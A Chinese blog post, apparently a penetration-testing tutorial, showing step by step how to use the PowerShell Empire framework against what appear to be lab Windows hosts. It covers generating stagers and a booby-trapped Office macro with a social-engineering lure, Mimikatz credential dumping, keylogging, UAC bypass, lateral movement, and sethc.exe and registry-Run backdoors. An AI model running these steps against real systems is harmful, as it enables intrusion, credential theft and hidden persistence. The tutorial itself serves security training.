@@ -1,0 +1,277 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>北孤清茶lthの博客 | 北孤清茶lthの博客</title><meta name="author" content="北孤清茶lth"><meta name="copyright" content="北孤清茶lth"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Empire简介Empire是一个针对windows平台的使用PowerShell脚本作为攻击载荷的渗透攻击框架，包括了从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等等，并且能够适应通信躲避网络检测和大部分安全防护工具的查">
+<meta property="og:type" content="article">
+<meta property="og:title" content="北孤清茶lthの博客">
+<meta property="og:url" content="http://example.com/2022/05/24/empire%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="北孤清茶lthの博客">
+<meta property="og:description" content="Empire简介Empire是一个针对windows平台的使用PowerShell脚本作为攻击载荷的渗透攻击框架，包括了从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等等，并且能够适应通信躲避网络检测和大部分安全防护工具的查">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg">
+<meta property="article:published_time" content="2022-05-24T05:43:19.587Z">
+<meta property="article:modified_time" content="2022-02-23T03:19:45.086Z">
+<meta property="article:author" content="北孤清茶lth">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://wallroom.io/img/3840x2160/bg-9d548e8.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2022/05/24/empire%E4%BD%BF%E7%94%A8/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 北孤清茶lth","link":"链接: ","source":"来源: 北孤清茶lthの博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '北孤清茶lthの博客',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-02-23 11:19:45'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/favicon.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://wallroom.io/img/3840x2160/bg-9d548e8.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">北孤清茶lthの博客</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 远方杂谈</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-24T05:43:19.587Z" title="发表于 2022-05-24 13:43:19">2022-05-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-02-23T03:19:45.086Z" title="更新于 2022-02-23 11:19:45">2022-02-23</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="Empire简介"><a href="#Empire简介" class="headerlink" title="Empire简介"></a><strong>Empire简介</strong></h2><p>Empire是一个针对windows平台的使用PowerShell脚本作为攻击载荷的渗透攻击框架，包括了从stager生成、提权到渗透维持的一系列功能。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，内置模块有键盘记录、Mimikatz、绕过UAC、内网扫描等等，并且能够适应通信躲避网络检测和大部分安全防护工具的查杀，简单来说有点类似于Metasploit，是一个基于PowerShell的远程控制木马。</p>
+<p>Empire的全部功能可以参考官方网站：<a target="_blank" rel="noopener" href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
+<h2 id="Empire的基本操作与使用教程"><a href="#Empire的基本操作与使用教程" class="headerlink" title="Empire的基本操作与使用教程"></a><strong>Empire的基本操作与使用教程</strong></h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>Empire运行在linux平台上，我是安装在vps上，用的是Ubuntu系统，安装过程中遇到了很多坑，看了好多个博客才解决，主要参考如下：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wuxinweii/article/details/121152538">https://blog.csdn.net/wuxinweii/article/details/121152538</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/91aec5a2e265">Empire安装 - 简书 (jianshu.com)</a></p>
+<p>安装主要命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/EmpireProject/Empire.git</span><br><span class="line"></span><br><span class="line">cd Empire</span><br><span class="line"></span><br><span class="line">cd setup</span><br><span class="line"></span><br><span class="line">sudo ./install.sh</span><br></pre></td></tr></table></figure>
+
+<p>安装结束后，在Empire目录下输入./empire就打开了Empire工具</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221175717569.png" alt="image-20220221175717569"></p>
+<h3 id="2-设置监听"><a href="#2-设置监听" class="headerlink" title="2.设置监听"></a>2.设置监听</h3><p>输入listeners进入到监听模块界面，如何已经建立监听的也可以在这也显示已经建立监听的监听器信息，我这里就是建立了3个监听。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221180055369.png" alt="image-20220221180055369"></p>
+<p>输入uselistener来设置采用何种模式，双击Tab可以看可以选择的模式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uselistener &lt;模式名字&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221194408644.png" alt="image-20220221194408644"></p>
+<p>输入info可以查看具体参数，类似msf的show options</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221194530457.png" alt="image-20220221194530457"></p>
+<p>常用设置参数为：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set Host &lt;vps的ip&gt;</span><br><span class="line"></span><br><span class="line">set Port &lt;端口&gt;  </span><br><span class="line"></span><br><span class="line">set Name &lt;随意命名&gt;</span><br><span class="line"></span><br><span class="line">execute  //开始监听</span><br></pre></td></tr></table></figure>
+
+<p>输入back命令返回上一层listeners界面上，使用list命令可以列出当前激活的listener，删除该监听，使用kill命令。</p>
+<p>当开启多个监听的时候，必须使用不同的名称，并且使用不同的端口，如果设置的端口已经被使用，会有提示信息。</p>
+<h3 id="3-生成木马"><a href="#3-生成木马" class="headerlink" title="3.生成木马"></a><strong>3.生成木马</strong></h3><p>Empire里拥有多个模块化的stagers，接着输入usestager来设置采用何种模块，我们同样通过双击Tab键可以看到模块。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221195537826.png" alt="image-20220221195537826"></p>
+<p>其中multi为通用模块、osx是mac操作系统、剩下的就是windows的模块，下面我们挑选其中几种常用类型的木马来具体讲解。</p>
+<h4 id="1-dll"><a href="#1-dll" class="headerlink" title="1.dll"></a><strong>1.dll</strong></h4><p>输入usestager windows/dll的命令，然后输入info命令来查看详细参数，如下图所示</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221200045862.png" alt="image-20220221200045862"></p>
+<p>设置一下Linstener，然后就可以execute，之后木马回生成到tmp下。</p>
+<h4 id="2-launcher"><a href="#2-launcher" class="headerlink" title="2.launcher"></a><strong>2.launcher</strong></h4><p>如果只是需要简单的powershell代码，在设置完相应模块后，可以直接在监听器菜单中键入</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">launcher &lt;language&gt; &lt;listenerName&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这将很快为您生成一行base64编码代码，这里输入back命令回到listeners下，然后输入launcher powershell lsylth(当前设置的listener名字)命令来生成一个Payload。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221201527414.png" alt="image-20220221201527414"></p>
+<p>将生成的powershell代码复制到靶机的powershell中运行，就可以上线了</p>
+<p>上线后可以用agent查看已经上线的主机</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221201826833.png" alt="image-20220221201826833"></p>
+<p>这里的代理Name他会取一个随机的名字，这里我们可以修改这个随机名字，使用rename <oldAgentName> <newAgentName>命令</newAgentName></oldAgentName></p>
+<h4 id="3-launcher-vbs"><a href="#3-launcher-vbs" class="headerlink" title="3.launcher_vbs"></a><strong>3</strong>.launcher_vbs</h4><p>输入usestager windows/launcher_vbs的命令，然后输入info命令来查看详细参数，使用下面命令设置下listener的参数并运行，默认会在tmp文件夹下生成launcher.vbs</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set listener &lt;监听器名字&gt;</span><br><span class="line">Execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-launcher-bat"><a href="#4-launcher-bat" class="headerlink" title="4.launcher_bat"></a><strong>4.launcher_bat</strong></h4><p>输入usestager windows/launcher_bat的命令，然后输入info命令查看详细参数，使用下面命令设置下listener的参数并输入execute命令运行，默认会在tmp文件夹下生成launcher.bat。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set listener &lt;监听器名字&gt;</span><br><span class="line">Execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="5-macro"><a href="#5-macro" class="headerlink" title="5.macro"></a><strong>5.macro</strong></h4><p>输入usestager windows/macro的命令，然后输入info命令来查看详细参数，这里使用下面命令设置下listener的参数并输入execute命令运行，默认会生成一个宏，储存在/tmp/macro文件中。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set listener &lt;监听器名字&gt;</span><br><span class="line">Execute</span><br></pre></td></tr></table></figure>
+
+<p>然后我们需要将生成的宏添加到一个Office文档里面，这里还是用上例word文件，点击“视图”标签选择“宏”，宏的位置选择当前文件，宏名随便起一个，然后点击创建，点击创建后，会弹出VB编辑界面，将里面原来的代码删除，把我们生成的宏复制进去，另存为“Word 97-2003文档（*.doc）”文件。最后我将这个修改过的word拷到目标机上执行，打开后会提示一个安全警告，这里需要使用一些社会工程学的策略，诱导目标点击“启用内容”</p>
+<h4 id="6-Ducky"><a href="#6-Ducky" class="headerlink" title="6.Ducky"></a><strong>6.Ducky</strong></h4><p>Empire也支持ducky 模块，也就是我们常说的“小黄鸭”，输入usestager windows/ducky命令，然后输入info命令来查看详细参数，这里只要设置下Listener参数，就可以生成用于烧制的代码，将该代码烧制“小黄鸭”中，插入对方电脑，就可以反弹回来。具体操作流程可以参考这篇文章：<a target="_blank" rel="noopener" href="http://www.freebuf.com/geek/141839.html">利用USB RUBBER DUCKY（USB 橡皮鸭）在目标机器上启动Empire或Meterpreter会话</a>。</p>
+<h3 id="4-连接代理及基本使用"><a href="#4-连接代理及基本使用" class="headerlink" title="4.连接代理及基本使用"></a><strong>4.连接代理及基本使用</strong></h3><p>目标主机反弹成功以后，我们可以使用agents命令列出当前已激活的代理，这里注意带有（*）的是已提权成功的代理。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220221221152973.png" alt="image-20220221221152973"></p>
+<p>然后使用interact命令连接代理，代理的名称支持TAB键的补全，连接成功后，我们输入help命令可以列出所有的命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">interact &lt;Name&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这里的Name指的是agents指向的id</p>
+<p>还有一些命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">help agentcmds   //使用的常用命令</span><br><span class="line"></span><br><span class="line">shell+cmd命令     //运行cmd命令</span><br><span class="line"></span><br><span class="line">mimikatz         //执行mimikatz的logonpasswords</span><br><span class="line"></span><br><span class="line">creds            //自动过滤整理出获取的用户密码</span><br><span class="line"></span><br><span class="line">remove stale    //删去已经失效的反弹</span><br></pre></td></tr></table></figure>
+
+<h3 id="5-信息收集"><a href="#5-信息收集" class="headerlink" title="5. 信息收集"></a>5. 信息收集</h3><p>Empire主要用于后渗透。所以信息收集是比较常用的一个模块，我们可以使用searchmodule命令搜索需要使用的模块，这里通过键入“usemodule collection”然后按Tab键来查看完整列表。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220222210255505.png" alt="image-20220222210255505"></p>
+<p>比较常用的模块：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、usemodule collection/screenshot    #屏幕截图</span><br><span class="line"></span><br><span class="line">2、usemodule collection/keylogger     #键盘记录</span><br><span class="line"></span><br><span class="line">3、usemodule collection/clipboard_monitor  #剪贴板记录</span><br><span class="line"></span><br><span class="line">4、usemodule situational_awareness/network/powerview/share_finder </span><br><span class="line">                                                   #查找共享</span><br><span class="line"></span><br><span class="line">5、usemodule situational_awareness/host/winenum   </span><br><span class="line">                                       #收集目标主机有用的信息</span><br><span class="line"></span><br><span class="line">6、usemodule situational_awareness/network/arpscan</span><br><span class="line">           #ARP扫描，set Range 192.168.31.0-192.168.31.254</span><br><span class="line"></span><br><span class="line">7、usemodule situational_awareness/network/reverse_dns</span><br><span class="line">                               #DNS信息获取         </span><br><span class="line"></span><br><span class="line">8、usemodule situational_awareness/network/powerview/user_hunter</span><br><span class="line">									#查找域管登陆服务器IP</span><br><span class="line"></span><br><span class="line">9、usemodule situational_awareness/network/powerview/find_localadmin_access                #本地管理组访问模块</span><br><span class="line"></span><br><span class="line">10、usemodulesituational_awareness/network/powerview/get_domain_controller            #获取域控制器    </span><br></pre></td></tr></table></figure>
+
+<h3 id="6-提权"><a href="#6-提权" class="headerlink" title="6. 提权"></a>6. 提权</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Whoami      #查看当前权限</span><br></pre></td></tr></table></figure>
+
+<h4 id="1-bypassuac"><a href="#1-bypassuac" class="headerlink" title="1.bypassuac"></a><strong>1.bypassuac</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usemodule privesc/bypassuac</span><br><span class="line">set Listener &lt;agent的id&gt;</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>带星号的即为提权成功的</p>
+<h4 id="2-bypassuac-wscript"><a href="#2-bypassuac-wscript" class="headerlink" title="2. bypassuac_wscript"></a><strong>2. bypassuac_wscript</strong></h4><p>这个模块大概原理是使用c:Windowswscript.exe执行payload，实现管理员权限执行payload，绕过UAC。只适用于系统为Windows 7，目前尚没有对应补丁，部分杀毒软件会有提示。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usemodule privesc/bypassuac_wscript</span><br><span class="line">set Listener &lt;agent的id&gt;</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-ms16-032"><a href="#3-ms16-032" class="headerlink" title="3. ms16-032"></a><strong>3. ms16-032</strong></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usemodule privesc/ms16-032</span><br><span class="line">set Listener &lt;agent的id&gt;</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<h4 id="4-PowerUp"><a href="#4-PowerUp" class="headerlink" title="4.PowerUp"></a><strong>4.PowerUp</strong></h4><p>Empire内置了PowerUp部分工具，用于系统提权，主要为Windows错误系统配置漏洞，Windows Services漏洞，AlwaysInstallElevated漏洞等8种提权方式，输入“usemodule privesc/powerup”然后按Tab键来查看完整列表</p>
+<h5 id="4-1-AllChecks-模块"><a href="#4-1-AllChecks-模块" class="headerlink" title="4.1 AllChecks****模块"></a><strong>4.1 AllChecks****模块</strong></h5><p>如何查找上述漏洞，就要用到这个模块了。和Powersploit下powerup中的Invoke-AllChecks模块一样，该模块可以执行所有脚本检查系统漏洞，输入下列命令，如下图所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usemodule privesc/powerup/allchecks</span><br><span class="line"></span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220222220922525.png" alt="image-20220222220922525"></p>
+<h4 id="5-GPP"><a href="#5-GPP" class="headerlink" title="5.GPP"></a><strong>5.GPP</strong></h4><p>在域里面很多都会启用组策略首选项来执行本地密码更改，以便于管理和映像部署。缺点是任何普通域用户都可以从相关域控制器的SYSVOL中读取到部署信息。虽然他是采用AES 256加密的，使用usemodule privesc/gpp 。</p>
+<h2 id="7-横向渗透"><a href="#7-横向渗透" class="headerlink" title="7. 横向渗透"></a>7. 横向渗透</h2><h4 id="1-令牌窃取"><a href="#1-令牌窃取" class="headerlink" title="1.令牌窃取"></a>1.令牌窃取</h4><p>我们在获取到服务器权限后，可以使用内置mimikatz获取系统密码，执行完毕后输入creds命令查看Empire列举的密码。</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220222231535663.png" alt="image-20220222231535663"></p>
+<p>发现有域用户在此服务器上登陆，此时我们可以窃取域用户身份，然后进行横向移动，首先先来窃取身份，使用命令pth<ID>，这里的ID号就是creds下的CredID号，我们这里来窃取administrator的身份令牌，执行Pth 3命令，如下图所示。</ID></p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220222234442944.png" alt="image-20220222234442944"></p>
+<p>通过steal_token命令来窃取这个命令，我们先尝试访问域内另一台主机</p>
+<p><img src="../Blog/source/images/empire%E4%BD%BF%E7%94%A8/image-20220222235848550.png" alt="image-20220222235848550"></p>
+<h4 id="2-会话注入"><a href="#2-会话注入" class="headerlink" title="**2.**会话注入"></a>**2.**会话注入</h4><p>使用usemodule management/psinject模块来进程注入，获取权限，输入info查看参数设置，设置下Listeners和ProcID这2个参数，这里的ProcID还是之前的CMD的1380，运行后反弹回一个域用户权限shell。</p>
+<h4 id="3-Invoke-PsExec"><a href="#3-Invoke-PsExec" class="headerlink" title="3.Invoke-PsExec"></a><strong>3.Invoke-PsExec</strong></h4><p>PsExec是我在Metasploit下经常使用的模块，还有pstools工具包当中也有psexec，缺点是该工具基本杀毒软件都能检测到，并会留下日志，而且需要开启admin$ 445端口共享。优点是可以直接返回SYSTEM权限。这里我们要演示的是Empire下的Invoke-Psexec模块。</p>
+<p>使用该模块的前提是我们已经获得本地管理员权限，甚至域管理员账户，然后以此来进一步持续渗透整个内网。</p>
+<p>现在使用模块usemodule lateral_movement/invoke_psexec渗透域内另一台机器WIN7-X86，输入info查看设置参数</p>
+<p>这里要设置下机器名和监听，输入下列命令，反弹成功。如下图所示。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set ComputerName WIN7-X86.shuteer.testlab</span><br><span class="line">Set Listenershuteer</span><br><span class="line">Execute</span><br></pre></td></tr></table></figure>
+
+<p>输入agents命令查看当前agents，多了一个IP为192.168.31.158，机器名为WIN7-X86的服务器，</p>
+<p><strong>4.Invoke-WMI</strong></p>
+<p>它比PsExec安全，所有window系统启用该服务，当攻击者使用wmiexec来进行攻击时，Windows系统默认不会在日志中记录这些操作，这意味着可以做到攻击无日志，同时攻击脚本无需写入到磁盘，具有极高的隐蔽性。但防火墙开启将会无法连接。输入usemodule lateral_movement/invoke_wmi，使用该模块，输入info命令查看具体参数，如下图所示。</p>
+<p>这里一样需要设置下机器名和监听，输入下列命令，执行execute命令反弹成功。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set ComputerName WIN7-X86.shuteer.testlab</span><br><span class="line">Set Listener shuteer</span><br><span class="line">Execute</span><br></pre></td></tr></table></figure>
+
+<p>WMI还有一个usemodule lateral_movement/invoke_wmi_debugger模块，是使用WMI去设置五个Windows Accessibility可执行文件中任意一个的调试器。这些可执行文件包括sethc.exe（粘滞键，五下shift可触发），narrator.exe（文本转语音，Utilman接口激活）、Utilman.exe（windows辅助管理器，Win+U启用），Osk.exe（虚拟键盘，Utilman接口启用）、Magnify.exe（放大镜，Utilman接口启用）。</p>
+<p><strong>5.Powershell Remoting</strong></p>
+<p>PowerShell remoting是Powershell的远程管理功能，开启<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/aa384426(v=vs.85).aspx">Windows远程管理服务</a>WinRM会监听5985端口，该服务默认在Windows Server 2012中是启动的，在Windows Server 2003、2008和2008 R2需要通过手动启动。</p>
+<p>如果目标主机启用了PSRemoting，或者拥有启用它的权限的凭据，则可以使用他来进行横向渗透，使用usemodule lateral_movement/invoke_psremoting模块。</p>
+<h2 id="8-后门"><a href="#8-后门" class="headerlink" title="8. 后门"></a>8. 后门</h2><h4 id="1-权限持久性劫持shift后门"><a href="#1-权限持久性劫持shift后门" class="headerlink" title="**1.**权限持久性劫持shift后门"></a>**1.**权限持久性劫持shift后门</h4><p>输入命令usemodule lateral_movement/invoke_wmi_debugger模块，输入info查看设置参数</p>
+<p>这里需要设置几个参数，我们输入下面命令，如下图所示</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set Listener  shuteer</span><br><span class="line">set ComputerName  WIN7-64.shuteer.testlab</span><br><span class="line">set TargetBinary sethc.exe</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>运行后，在目标主机远程登录窗口按5次shift即可触发后门，有一个黑框一闪而过，这里看我们的Empire已经有反弹代理上线，这里为了截图我按了3回shift后门，所以弹回来3个代理。</p>
+<p>注意：sethc.exe这里有几个可以替换的选项。</p>
+<p>A.Utilman.exe（快捷键为: Win + U）</p>
+<p>B.osk.exe（屏幕上的键盘Win + U启动再选择）</p>
+<p>C.Narrator.exe (启动讲述人Win + U启动再选择)</p>
+<p>D.Magnify.exe(放大镜Win + U启动再选择）</p>
+<h4 id="2-注册表注入后门"><a href="#2-注册表注入后门" class="headerlink" title="2.注册表注入后门"></a><strong>2.注册表注入后门</strong></h4><p>使用usemodule persistence/userland/registry模块，运行后会在目标主机启动项添加一个命令，按如下命令设置其中几个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set Listener shuteer</span><br><span class="line">set RegPath HKCU:SoftwareMicrosoftWindowsCurrentVersionRun</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+
+<p>运行后当我们登陆系统时候就会运行，反弹回来</p>
